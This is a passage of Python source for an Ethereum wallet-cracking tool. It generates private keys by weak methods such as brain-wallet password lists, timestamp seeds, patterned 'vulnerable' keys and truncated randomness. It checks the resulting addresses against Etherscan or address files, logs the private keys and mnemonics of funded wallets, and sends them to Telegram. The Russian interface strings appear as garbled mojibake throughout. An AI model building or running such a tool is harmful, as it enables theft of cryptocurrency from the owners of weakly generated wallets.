        print(Fore.CYAN + "12. –£—Å–µ—á—ë–Ω–Ω—ã–µ –±–æ–ª—å—à–∏–µ —á–∏—Å–ª–∞" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç 64 —Å–ª—É—á–∞–π–Ω—ã—Ö –±–∞–π—Ç–∞ (512 –±–∏—Ç), —É—Å–µ–∫–∞–µ—Ç –¥–æ 32 –±–∞–π—Ç\n"
                           "   (256 –±–∏—Ç) –∏ —Ö—ç—à–∏—Ä—É–µ—Ç —á–µ—Ä–µ–∑ Keccak-256. –£—Å–µ—á–µ–Ω–∏–µ —Å–Ω–∏–∂–∞–µ—Ç —ç–Ω—Ç—Ä–æ–ø–∏—é,\n"
                           "   –æ—Å–æ–±–µ–Ω–Ω–æ –µ—Å–ª–∏ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã." + Style.RESET_ALL)
        print(Fore.CYAN + "–î–ª—è –ø–∞—É–∑—ã –Ω–∞–∂–º–∏—Ç–µ 'PgDN', –¥–ª—è –≤–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –Ω–∞–∂–º–∏—Ç–µ 'PgUp'" + Style.RESET_ALL)
        choice = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –º–µ—Ç–æ–¥–∞ (1-12): " + Style.RESET_ALL)
        if choice in [str(i) for i in range(1, 13)]:
            return int(choice)
        print(Fore.RED + "–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞." + Style.RESET_ALL)

async def choose_check_mode():
    while True:
        print(Fore.CYAN + "–í—ã–±–µ—Ä–∏—Ç–µ —Ä–µ–∂–∏–º –ø—Ä–æ–≤–µ—Ä–∫–∏:" + Style.RESET_ALL)
        print(Fore.CYAN + "1. –¢–æ–ª—å–∫–æ –æ–Ω–ª–∞–π–Ω (–ø—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ API)" + Style.RESET_ALL)
        print(Fore.CYAN + "2. –û–Ω–ª–∞–π–Ω + —Ñ–∞–π–ª (API –∏ —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å —Ñ–∞–π–ª–æ–º)" + Style.RESET_ALL)
        print(Fore.CYAN + "3. –¢–æ–ª—å–∫–æ —Ñ–∞–π–ª (—Å—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å —Ñ–∞–π–ª–æ–º)" + Style.RESET_ALL)
        choice = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ä–µ–∂–∏–º–∞ (1-3): " + Style.RESET_ALL)
        if choice in ['1', '2', '3']:
            mode = int(choice)
            file_paths = []
            addresses_set = set()
            if mode in [2, 3]:
                while True:
                    paths = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç–∏ –∫ *.txt —Ñ–∞–π–ª–∞–º (—á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é): " + Style.RESET_ALL).strip()
                    if not paths:
                        print(Fore.RED + "–£–∫–∞–∂–∏—Ç–µ —Ö–æ—Ç—è –±—ã –æ–¥–∏–Ω —Ñ–∞–π–ª." + Style.RESET_ALL)
                        continue
                    file_paths = [p.strip() for p in paths.split(',')]
                    valid = True
                    for path in file_paths:
                        if not os.path.exists(path):
                            print(Fore.RED + f"–§–∞–π–ª {path} –Ω–µ –Ω–∞–π–¥–µ–Ω." + Style.RESET_ALL)
                            valid = False
                        elif not path.endswith('.txt'):
                            print(Fore.RED + f"–§–∞–π–ª {path} –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å .txt." + Style.RESET_ALL)
                            valid = False
                    if valid and len(file_paths) <= 5:
                        break
                    elif len(file_paths) > 5:
                        print(Fore.RED + "–ú–∞–∫—Å–∏–º—É–º 5 —Ñ–∞–π–ª–æ–≤." + Style.RESET_ALL)
                addresses_set = await load_addresses_to_memory(file_paths)
            return mode, file_paths, addresses_set
        print(Fore.RED + "–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞." + Style.RESET_ALL)

def choose_group():
    print(Fore.CYAN + "–í—ã–±–µ—Ä–∏—Ç–µ –≥—Ä—É–ø–ø—É (A-H):" + Style.RESET_ALL)
    group = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –±—É–∫–≤—É –≥—Ä—É–ø–ø—ã: " + Style.RESET_ALL).upper()
    if group in GROUP_RANGES:
        return group
    print(Fore.RED + "–ù–µ–≤–µ—Ä–Ω–∞—è –≥—Ä—É–ø–ø–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞." + Style.RESET_ALL)
    return choose_group()    

# –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
async def save_wallet_results(address, private_key, mnemonic_phrase, method, balance=None, group=None, source="API"):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    wallet_info = f"{address} {private_key} [from {source}]"
    if mnemonic_phrase and method == 9:
        wallet_info += f" [password: {mnemonic_phrase}]"
    elif mnemonic_phrase:
        wallet_info += f" [mnemonic: {mnemonic_phrase}]"
    wallet_info += "\n"
    
    wallet_info_balance = f"{address} {private_key} [from {source}]"
    if mnemonic_phrase and method == 9:
        wallet_info_balance += f" [password: {mnemonic_phrase}]"
    elif mnemonic_phrase:
        wallet_info_balance += f" [mnemonic: {mnemonic_phrase}]"
    wallet_info_balance += f" [Balance: {balance if balance is not None else 'N/A'} ETH]\n"
    
    print(Fore.GREEN + "\n–ù–∞–π–¥–µ–Ω –∫–æ—à–µ–ª—ë–∫!" + Style.RESET_ALL)
    print(Fore.GREEN + f"–ê–¥—Ä–µ—Å: {address}" + Style.RESET_ALL)
    print(Fore.GREEN + f"–ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á: {private_key}" + Style.RESET_ALL)
    print(Fore.GREEN + f"–ú–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–∞—è —Ñ—Ä–∞–∑–∞/–ü–∞—Ä–æ–ª—å: {mnemonic_phrase if mnemonic_phrase else 'N/A'}" + Style.RESET_ALL)
    print(Fore.GREEN + f"–ú–µ—Ç–æ–¥: {method}" + Style.RESET_ALL)
    print(Fore.GREEN + f"–ì—Ä—É–ø–ø–∞: {group if group else 'N/A'}" + Style.RESET_ALL)
    print(Fore.GREEN + f"–ë–∞–ª–∞–Ω—Å: {balance if balance is not None else 'N/A'} ETH" + Style.RESET_ALL)
    print(Fore.GREEN + f"–ò—Å—Ç–æ—á–Ω–∏–∫: {source}" + Style.RESET_ALL)
    print(Fore.GREEN + f"–í—Ä–µ–º—è: {timestamp}" + Style.RESET_ALL)
    
    try:
        async with aiofiles.open(SUCCESS_FILE, 'a', encoding='utf-8') as f:
            await f.write(wallet_info)
        logger.info(f"–ö–æ—à–µ–ª—ë–∫ —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ {SUCCESS_FILE}: {address}")
        # –¶–∏–∫–ª–∏—á–µ—Å–∫–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è successful_wallets.txt
        if os.path.exists(SUCCESS_FILE) and os.path.getsize(SUCCESS_FILE) > 100 * 1024 * 1024:
            async with aiofiles.open(SUCCESS_FILE, 'r', encoding='utf-8') as f:
                lines = await f.readlines()
            keep_lines = lines[int(len(lines) * 0.5):]  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ 50% —Å—Ç—Ä–æ–∫
            async with aiofiles.open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
                await f.writelines(keep_lines)
            logger.info(f"–§–∞–π–ª {SUCCESS_FILE} –æ–±—Ä–µ–∑–∞–Ω —Ü–∏–∫–ª–∏—á–µ—Å–∫–∏ (—É–¥–∞–ª–µ–Ω—ã —Å—Ç–∞—Ä—ã–µ –∑–∞–ø–∏—Å–∏)")
            print(Fore.YELLOW + f"–§–∞–π–ª {SUCCESS_FILE} –æ–±—Ä–µ–∑–∞–Ω: —É–¥–∞–ª–µ–Ω—ã —Å—Ç–∞—Ä—ã–µ –∑–∞–ø–∏—Å–∏." + Style.RESET_ALL)
        
        if balance is not None and balance > 0:
            async with aiofiles.open(BALANCE_FILE, 'a', encoding='utf-8') as f:
                await f.write(wallet_info_balance)
            logger.info(f"–ö–æ—à–µ–ª—ë–∫ —Å –±–∞–ª–∞–Ω—Å–æ–º —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ {BALANCE_FILE}: {address}, –ë–∞–ª–∞–Ω—Å: {balance} ETH")
            # –¶–∏–∫–ª–∏—á–µ—Å–∫–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è successful_wallets_balance.txt
            if os.path.exists(BALANCE_FILE) and os.path.getsize(BALANCE_FILE) > 100 * 1024 * 1024:
                async with aiofiles.open(BALANCE_FILE, 'r', encoding='utf-8') as f:
                    lines = await f.readlines()
                keep_lines = lines[int(len(lines) * 0.5):]
                async with aiofiles.open(BALANCE_FILE, 'w', encoding='utf-8') as f:
                    await f.writelines(keep_lines)
                logger.info(f"–§–∞–π–ª {BALANCE_FILE} –æ–±—Ä–µ–∑–∞–Ω —Ü–∏–∫–ª–∏—á–µ—Å–∫–∏ (—É–¥–∞–ª–µ–Ω—ã —Å—Ç–∞—Ä—ã–µ –∑–∞–ø–∏—Å–∏)")
                print(Fore.YELLOW + f"–§–∞–π–ª {BALANCE_FILE} –æ–±—Ä–µ–∑–∞–Ω: —É–¥–∞–ª–µ–Ω—ã —Å—Ç–∞—Ä—ã–µ –∑–∞–ø–∏—Å–∏." + Style.RESET_ALL)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞ {address}: {e}")
        print(Fore.RED + f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞ {address}: {e}" + Style.RESET_ALL)

async def save_bad_wallet(address, private_key, mnemonic_phrase, method, group=None):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    wallet_info = (
        f"[{timestamp}] Address: {address}, Private Key: {private_key}, "
        f"Mnemonic/Password: {mnemonic_phrase if mnemonic_phrase else 'N/A'}, "
        f"Method: {method}, Group: {group if group else 'N/A'}\n"
    )
    try:
        async with aiofiles.open(BAD_FILE, 'a', encoding='utf-8') as f:
            await f.write(wallet_info)
        logger.info(f"–ü—É—Å—Ç–æ–π –∫–æ—à–µ–ª—ë–∫ —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ {BAD_FILE}: {address}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –ø—É—Å—Ç–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ {address}: {e}")
        print(Fore.RED + f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –ø—É—Å—Ç–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ {address}: {e}" + Style.RESET_ALL)

# –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏
async def generate_keys(method, check_mode, addresses_set, file_paths, session, group=None, prefix=None, suffix=None, vulnerable_type=None, password_file=None, timestamp=None):
    global stats
    passwords = load_password_dictionary(password_file) if password_file else []
    if method in [4, 9] and not passwords:
        print(Fore.RED + f"–§–∞–π–ª {'—Å–ª–æ–≤' if method == 4 else '–ø–∞—Ä–æ–ª–µ–π'} –ø—É—Å—Ç –∏–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å. –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ." + Style.RESET_ALL)
        logger.error(f"–§–∞–π–ª {'—Å–ª–æ–≤' if method == 4 else '–ø–∞—Ä–æ–ª–µ–π'} –ø—É—Å—Ç –∏–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å.")
        return

    state = load_state()
    start_index = state['start_index']
    last_password_index = state['last_password_index']
    iteration = start_index
    password_index = last_password_index
    progress_bar = tqdm.tqdm(initial=start_index, desc="Generating keys", unit="keys")

    # –û—á–∏—Å—Ç–∫–∞ used_keys –¥–ª—è –º–µ—Ç–æ–¥–æ–≤ 4 –∏ 9, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –≤–ª–∏—è–Ω–∏—è –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –∑–∞–ø—É—Å–∫–æ–≤
    if method in [4, 9] and passwords:
        async with used_keys_lock:
            used_keys.clear()
        logger.info("–ú–Ω–æ–∂–µ—Å—Ç–≤–æ used_keys –æ—á–∏—â–µ–Ω–æ –¥–ª—è –º–µ—Ç–æ–¥–∞ {}".format(method))
        print(Fore.YELLOW + "–ú–Ω–æ–∂–µ—Å—Ç–≤–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã—Ö –∫–ª—é—á–µ–π –æ—á–∏—â–µ–Ω–æ." + Style.RESET_ALL)

    while True:
        await pause_event.wait()
        if method in [4, 9] and passwords and password_index >= len(passwords):
            print(Fore.YELLOW + "–í—Å–µ –ø–∞—Ä–æ–ª–∏ –∏–∑ —Å–ª–æ–≤–∞—Ä—è –ø—Ä–æ–≤–µ—Ä–µ–Ω—ã." + Style.RESET_ALL)
            logger.info("–í—Å–µ –ø–∞—Ä–æ–ª–∏ –∏–∑ —Å–ª–æ–≤–∞—Ä—è –ø—Ä–æ–≤–µ—Ä–µ–Ω—ã.")
            save_state(0, 0)
            print(Fore.GREEN + "–°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–±—Ä–æ—à–µ–Ω–æ: start_index=0, last_password_index=0" + Style.RESET_ALL)
            logger.info("–°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–±—Ä–æ—à–µ–Ω–æ: start_index=0, last_password_index=0")
            break

        password = passwords[password_index] if passwords and method in [4, 9] else None
        if method == 2:
            private_key, address = generate_vanity_address(prefix, suffix)
            mnemonic_phrase = None
        elif method == 3:
            private_key = generate_private_key_in_group(group)
            address = get_address_from_private_key(private_key)
            mnemonic_phrase = None
        else:
            private_key, mnemonic_phrase = await generate_private_key_by_method(
                method, used_keys, used_keys_lock, vulnerable_type, password, timestamp
            )
            if not private_key:
                print(Fore.RED + "–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–ª—é—á–∞." + Style.RESET_ALL)
                logger.error("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –∫–ª—é—á.")
                continue
            address = get_address_from_private_key(private_key)

        if not is_valid_eth_address(address):
            print(Fore.RED + f"–ù–µ–≤–∞–ª–∏–¥–Ω—ã–π –∞–¥—Ä–µ—Å: {address}" + Style.RESET_ALL)
            logger.error(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–π –∞–¥—Ä–µ—Å: {address}")
            continue

        stats['keys_generated'] += 1
        if method == 3 and group:
            stats['group_stats'][group]['keys'] += 1
        progress_bar.update(1)

        # –í—ã–≤–æ–¥ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–º –∫–ª—é—á–µ
        print(Fore.CYAN + f"\n–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∫–ª—é—á #{stats['keys_generated']}:" + Style.RESET_ALL)
        print(Fore.CYAN + f"–ê–¥—Ä–µ—Å: {address}" + Style.RESET_ALL)
        print(Fore.CYAN + f"–ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á: {private_key}" + Style.RESET_ALL)
        if mnemonic_phrase:
            print(Fore.CYAN + f"{'–ú–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–∞—è —Ñ—Ä–∞–∑–∞' if method != 9 else '–ü–∞—Ä–æ–ª—å'}: {mnemonic_phrase}" + Style.RESET_ALL)

        # –¶–∏–∫–ª–∏—á–µ—Å–∫–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è eth_generator.log
        if os.path.exists('eth_generator.log') and os.path.getsize('eth_generator.log') > 100 * 1024 * 1024:
            try:
                async with aiofiles.open('eth_generator.log', 'r', encoding='utf-8') as f:
                    lines = await f.readlines()
                keep_lines = lines[int(len(lines) * 0.5):]
                async with aiofiles.open('eth_generator.log', 'wb') as f:
                    await f.write(b'\xEF\xBB\xBF')
                    await f.write(''.join(keep_lines).encode('utf-8'))
                logger.info("–§–∞–π–ª eth_generator.log –æ–±—Ä–µ–∑–∞–Ω —Ü–∏–∫–ª–∏—á–µ—Å–∫–∏")
                print(Fore.YELLOW + "–õ–æ–≥-—Ñ–∞–π–ª –æ–±—Ä–µ–∑–∞–Ω: —É–¥–∞–ª–µ–Ω—ã —Å—Ç–∞—Ä—ã–µ –∑–∞–ø–∏—Å–∏." + Style.RESET_ALL)
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ü–∏–∫–ª–∏—á–µ—Å–∫–æ–π –æ—á–∏—Å—Ç–∫–µ –ª–æ–≥–∞: {e}")
                print(Fore.RED + f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –ª–æ–≥–∞: {e}" + Style.RESET_ALL)

        match_found = False
        balance = None
        if check_mode in [2, 3]:
            if await compare_address_with_file(address, addresses_set):
                stats['matches_file'] += 1
                if method == 3 and group:
                    stats['group_stats'][group]['matches_file'] += 1
                match_found = True
                message = "–°–æ–≤–ø–∞–¥–µ–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–æ –≤ —Ñ–∞–π–ª–µ."
                await send_telegram_message(message, session, method, address, private_key, mnemonic_phrase, balance)
                await save_wallet_results(address, private_key, mnemonic_phrase, method, balance, group, source="file")
                print(Fore.GREEN + "–°–æ–≤–ø–∞–¥–µ–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–æ –≤ —Ñ–∞–π–ª–µ!" + Style.RESET_ALL)
            elif check_mode == 3:
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∞–¥—Ä–µ—Å–∞, –Ω–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –≤ —Ñ–∞–π–ª–µ, –∫–∞–∫ –ø—É—Å—Ç—ã–µ –≤ —Ä–µ–∂–∏–º–µ "–¢–æ–ª—å–∫–æ —Ñ–∞–π–ª"
                await save_bad_wallet(address, private_key, mnemonic_phrase, method, group)
                print(Fore.YELLOW + "–ê–¥—Ä–µ—Å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ —Ñ–∞–π–ª–µ. –°–æ—Ö—Ä–∞–Ω—ë–Ω –∫–∞–∫ –ø—É—Å—Ç–æ–π." + Style.RESET_ALL)
                logger.info(f"–ê–¥—Ä–µ—Å {address} —Å–æ—Ö—Ä–∞–Ω—ë–Ω –∫–∞–∫ –ø—É—Å—Ç–æ–π –≤ {BAD_FILE} (—Ä–µ–∂–∏–º check_mode=3)")

        if check_mode in [1, 2] and not match_found:
            if await check_transactions(address, session):
                stats['matches_api'] += 1
                if method == 3 and group:
                    stats['group_stats'][group]['matches_api'] += 1
                match_found = True
                balance = await get_balance_etherscan(address, session)
                if balance is not None:
                    print(Fore.GREEN + f"–ë–∞–ª–∞–Ω—Å: {balance} ETH" + Style.RESET_ALL)
                    if balance > 0:
                        stats['addresses_with_balance'] += 1
                        message = f"–ê–¥—Ä–µ—Å —Å –±–∞–ª–∞–Ω—Å–æ–º: {balance} ETH."
                    else:
                        message = "–ù–∞–π–¥–µ–Ω –∞–¥—Ä–µ—Å —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏, –Ω–æ –±–∞–ª–∞–Ω—Å —Ä–∞–≤–µ–Ω 0."
                else:
                    message = "–ù–∞–π–¥–µ–Ω –∞–¥—Ä–µ—Å —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏, –Ω–æ –±–∞–ª–∞–Ω—Å –Ω–µ –ø—Ä–æ–≤–µ—Ä–µ–Ω."
                await send_telegram_message(message, session, method, address, private_key, mnemonic_phrase, balance)
                await save_wallet_results(address, private_key, mnemonic_phrase, method, balance, group, source="API")
                print(Fore.GREEN + message + Style.RESET_ALL)
            else:
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∞–¥—Ä–µ—Å–∞ –±–µ–∑ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –∫–∞–∫ –ø—É—Å—Ç—ã–µ –≤ —Ä–µ–∂–∏–º–∞—Ö "–¢–æ–ª—å–∫–æ –æ–Ω–ª–∞–π–Ω" –∏ "–û–Ω–ª–∞–π–Ω + —Ñ–∞–π–ª"
                await save_bad_wallet(address, private_key, mnemonic_phrase, method, group)
                print(Fore.YELLOW + "–ê–¥—Ä–µ—Å –±–µ–∑ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π. –°–æ—Ö—Ä–∞–Ω—ë–Ω –∫–∞–∫ –ø—É—Å—Ç–æ–π." + Style.RESET_ALL)
                logger.info(f"–ê–¥—Ä–µ—Å {address} —Å–æ—Ö—Ä–∞–Ω—ë–Ω –∫–∞–∫ –ø—É—Å—Ç–æ–π –≤ {BAD_FILE} (—Ä–µ–∂–∏–º check_mode={check_mode})")

        iteration += 1
        if passwords and method in [4, 9]:
            password_index += 1
        if iteration % 10 == 0:
            save_state(iteration, password_index)
            await save_stats(method, check_mode, group)

async def main():
    global last_timestamp
    try:
        logger.info("–ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã")
        threading.Thread(target=listen_for_pause, daemon=True).start()
        async with aiohttp.ClientSession() as session:
            method = choose_generation_method()  # –î–æ–ª–∂–Ω–æ –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—å –º–µ–Ω—é
            check_mode, file_paths, addresses_set = await choose_check_mode()
            group = prefix = suffix = vulnerable_type = password_file = timestamp = None

            if method == 2:
                prefix, suffix = choose_vanity_pattern()
            elif method == 3:
                group = choose_group()
            elif method == 4:
                password_file = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å–æ —Å–ø–∏—Å–∫–æ–º —Å–ª–æ–≤ –¥–ª—è –º–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–∏—Ö —Ñ—Ä–∞–∑ (–∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ Enter –¥–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏): " + Style.RESET_ALL).strip()
                if password_file and not os.path.exists(password_file):
                    print(Fore.RED + f"–§–∞–π–ª {password_file} –Ω–µ –Ω–∞–π–¥–µ–Ω." + Style.RESET_ALL)
                    logger.error(f"–§–∞–π–ª —Å–ª–æ–≤ {password_file} –Ω–µ –Ω–∞–π–¥–µ–Ω.")
                    return
            elif method == 5:
                print(Fore.CYAN + "–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —É—è–∑–≤–∏–º–æ–≥–æ –∫–ª—é—á–∞:" + Style.RESET_ALL)
                print(Fore.CYAN + "1. –ü–æ–≤—Ç–æ—Ä—è—é—â–∏–µ—Å—è —Å–∏–º–≤–æ–ª—ã" + Style.RESET_ALL)
                print(Fore.CYAN + "2. –ü–æ–ª—É—Å–ª—É—á–∞–π–Ω—ã–µ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏" + Style.RESET_ALL)
                print(Fore.CYAN + "3. –ü—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã" + Style.RESET_ALL)
                vulnerable_type = int(input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–∏–ø–∞ (1-3): " + Style.RESET_ALL))
                if vulnerable_type not in [1, 2, 3]:
                    print(Fore.RED + "–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä." + Style.RESET_ALL)
                    return
            elif method == 6:
                timestamp_input = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –¥–∞—Ç—É (–ì–ì–ì–ì-–ú–ú-–î–î) –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ Enter –¥–ª—è —Ç–µ–∫—É—â–µ–π: " + Style.RESET_ALL)
                if timestamp_input:
                    try:
                        timestamp = int(datetime.datetime.strptime(timestamp_input, '%Y-%m-%d').timestamp())
                    except ValueError:
                        print(Fore.RED + "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∞—Ç—ã. –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–µ–∫—É—â–∞—è." + Style.RESET_ALL)
                        timestamp = int(datetime.datetime.now().timestamp())
                else:
                    timestamp = int(datetime.datetime.now().timestamp())
                last_timestamp = timestamp
            elif method == 9:
                password_file = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å–æ —Å–ø–∏—Å–∫–æ–º –ø–∞—Ä–æ–ª–µ–π: " + Style.RESET_ALL).strip()
                if not os.path.exists(password_file):
                    print(Fore.RED + f"–§–∞–π–ª {password_file} –Ω–µ –Ω–∞–π–¥–µ–Ω." + Style.RESET_ALL)
                    logger.error(f"–§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π {password_file} –Ω–µ –Ω–∞–π–¥–µ–Ω.")
                    return

            mode_names = {1: "Online", 2: "Online+File", 3: "File"}
            print(Fore.CYAN + f"–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –º–µ—Ç–æ–¥–æ–º {method}, —Ä–µ–∂–∏–º: {mode_names[check_mode]}" + Style.RESET_ALL)
            logger.info(f"–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –º–µ—Ç–æ–¥–æ–º {method}, —Ä–µ–∂–∏–º: {mode_names[check_mode]}")

            try:
                await generate_keys(
                    method, check_mode, addresses_set, file_paths, session,
                    group=group, prefix=prefix, suffix=suffix,
                    vulnerable_type=vulnerable_type, password_file=password_file, timestamp=timestamp
                )
                # –î–ª—è –º–µ—Ç–æ–¥–æ–≤ 4 –∏ 9: –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø–æ—Å–ª–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤—Å–µ—Ö —Å–ª–æ–≤/–ø–∞—Ä–æ–ª–µ–π
                if method in [4, 9] and password_file:
                    print(Fore.GREEN + f"–í—Å–µ {'—Å–ª–æ–≤–∞' if method == 4 else '–ø–∞—Ä–æ–ª–∏'} –∏–∑ —Ñ–∞–π–ª–∞ –æ–±—Ä–∞–±–æ—Ç–∞–Ω—ã. –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã." + Style.RESET_ALL)
                    logger.info(f"–í—Å–µ {'—Å–ª–æ–≤–∞' if method == 4 else '–ø–∞—Ä–æ–ª–∏'} –∏–∑ —Ñ–∞–π–ª–∞ –æ–±—Ä–∞–±–æ—Ç–∞–Ω—ã. –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã.")
                    save_state(0, 0)  # –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
                    await save_stats(method, mode_names[check_mode], group)
                    print(Fore.GREEN + f"–û–±—Ä–∞–±–æ—Ç–∞–Ω–æ –∫–ª—é—á–µ–π: {stats['keys_generated']}" + Style.RESET_ALL)
                    print(Fore.GREEN + f"–°–æ–≤–ø–∞–¥–µ–Ω–∏–π (—Ñ–∞–π–ª): {stats['matches_file']}" + Style.RESET_ALL)
                    print(Fore.GREEN + f"–°–æ–≤–ø–∞–¥–µ–Ω–∏–π (API): {stats['matches_api']}" + Style.RESET_ALL)
                    print(Fore.GREEN + f"–ê–¥—Ä–µ—Å–æ–≤ —Å –±–∞–ª–∞–Ω—Å–æ–º: {stats['addresses_with_balance']}" + Style.RESET_ALL)
                    exit(0)
            except KeyboardInterrupt:
